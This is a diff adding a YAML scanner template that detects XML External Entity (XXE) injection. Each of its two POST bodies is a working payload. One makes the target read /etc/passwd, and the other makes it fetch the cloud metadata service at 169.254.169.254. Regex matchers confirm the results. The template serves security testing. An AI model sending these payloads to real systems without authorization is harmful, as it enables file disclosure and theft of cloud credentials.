@@ -1,0 +1,70 @@
+id: generic-xxe
+info:
+  name: XML External Entity (XXE) Injection
+  description: Detects XXE vulnerabilities in XML processing endpoints
+  owasp_category: A03:2025
+  severity: high
+  tags:
+    - xxe
+    - xml
+    - injection
+    - generic
+
+targets:
+  - id: XXE_FILE_READ
+    description: XXE allows reading local files
+    endpoints:
+      - path: "{{endpoint}}"
+        method: POST
+        content_type: "application/xml"
+    requests:
+      - method: POST
+        headers:
+          Content-Type: "application/xml"
+        body: |
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+          <data>&xxe;</data>
+    matchers:
+      - type: regex
+        regex:
+          - 'root:x:[0-9]+:[0-9]+:'
+          - '/bin/bash'
+          - 'daemon:'
+        condition: or
+      - type: status
+        condition: in
+        status:
+          - 200
+    matchers_condition: and
+    evidence_strength: direct
+    message: "XXE vulnerability allows reading local files"
+
+  - id: XXE_SSRF
+    description: XXE allows SSRF to internal services
+    endpoints:
+      - path: "{{endpoint}}"
+        method: POST
+        content_type: "application/xml"
+    requests:
+      - method: POST
+        headers:
+          Content-Type: "application/xml"
+        body: |
+          <?xml version="1.0" encoding="UTF-8"?>
+          <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
+          <data>&xxe;</data>
+    matchers:
+      - type: regex
+        regex:
+          - 'ami-[a-f0-9]{8}'
+          - 'placement'
+          - 'instance-id'
+        condition: or
+      - type: status
+        condition: in
+        status:
+          - 200
+    matchers_condition: and
+    evidence_strength: direct
+    message: "XXE vulnerability allows SSRF to cloud metadata"
